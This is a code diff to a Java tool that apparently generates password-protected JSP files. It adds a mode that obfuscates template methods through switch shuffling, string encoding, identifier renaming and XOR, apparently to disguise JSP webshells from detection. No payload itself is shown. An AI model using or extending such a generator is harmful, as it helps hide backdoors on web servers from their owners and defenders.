@@ -17,6 +17,7 @@ import java.io.IOException;
 import java.io.InputStream;
 
 
+@SuppressWarnings("all")
 public class Main {
     public static void main(String[] args) throws IOException {
         Logo.PrintLogo();
@@ -36,6 +37,30 @@ public class Main {
             String code = FileUtil.readFile(in);
             code = code.replace("__PASSWORD__", password);
             FileUtil.writeFile("result.jsp", code);
+            return;
+        }
+
+        if(command.superModule){
+            MethodDeclaration superMethod = getMethod("Javac.java");
+            MethodDeclaration decMethod = getMethod("Dec.java");
+            if(superMethod == null || decMethod == null){
+                return;
+            }
+            String newValue = SwitchModule.shuffle(superMethod);
+            SwitchModule.changeSwitch(superMethod, newValue);
+            int offset = StringModule.encodeString(superMethod);
+            StringModule.changeRef(superMethod, offset);
+            IdentifyModule.doIdentify(superMethod);
+            XORModule.doXOR(superMethod);
+            XORModule.doXOR(superMethod);
+
+            int decOffset = StringModule.encodeString(decMethod);
+            StringModule.changeRef(decMethod, decOffset);
+            IdentifyModule.doIdentify(decMethod);
+            XORModule.doXOR(decMethod);
+
+            WriteUtil.writeSuper(superMethod, decMethod, password, useUnicode);
+            System.out.println("Finish!");
             return;
         }
 
